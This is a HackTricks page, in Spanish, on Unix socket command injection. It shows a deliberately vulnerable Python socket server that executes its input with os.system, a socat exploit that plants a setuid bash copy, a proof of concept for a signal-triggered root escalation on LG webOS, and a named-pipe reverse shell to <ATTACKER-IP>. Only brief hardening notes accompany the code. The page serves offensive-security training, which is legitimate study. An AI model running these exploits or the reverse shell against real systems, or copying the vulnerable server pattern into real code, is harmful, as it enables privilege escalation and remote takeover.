# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Ejemplo de binding de un socket con Python

En el siguiente ejemplo se crea un **unix socket** (`/tmp/socket_test.s`) y todo lo **recibido** se va a **ejecutar** mediante `os.system`. Sé que no vas a encontrar esto en un entorno real, pero el objetivo de este ejemplo es mostrar cómo es el código que utiliza unix sockets y cómo gestionar la entrada en el peor caso posible.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Ejecuta** el código usando Python: `python s.py` y **comprueba cómo está escuchando el socket**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Caso de estudio: escalada activada por una señal en un socket UNIX propiedad de root (LG webOS)

Algunos daemons privilegiados exponen un socket UNIX propiedad de root que acepta entradas no confiables y vincula acciones privilegiadas a los thread-IDs y las señales. Si el protocolo permite que un cliente sin privilegios influya en qué thread nativo recibe la señal, es posible activar una ruta de código privilegiada y escalar privilegios.

Patrón observado:
- Conectarse a un socket propiedad de root (por ejemplo, /tmp/remotelogger).
- Crear un thread y obtener su identificador nativo (TID).
- Enviar el TID (packed) junto con padding como solicitud; recibir un acuse de recibo.
- Enviar una señal específica a ese TID para activar el comportamiento privilegiado.

Esquema mínimo del PoC:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Para convertir esto en una shell de root, se puede usar un patrón simple de named-pipe + nc:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Notas:
- Esta clase de bugs surge al confiar en valores derivados del estado del cliente sin privilegios (TIDs) y vincularlos a signal handlers o lógica con privilegios.
- Refuerza la seguridad aplicando credenciales en el socket, validando los formatos de los mensajes y desacoplando las operaciones con privilegios de los identificadores de thread proporcionados externamente.

## Referencias

- [Path Traversal, Authentication Bypass y Full Device Takeover en LG WebOS TV (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
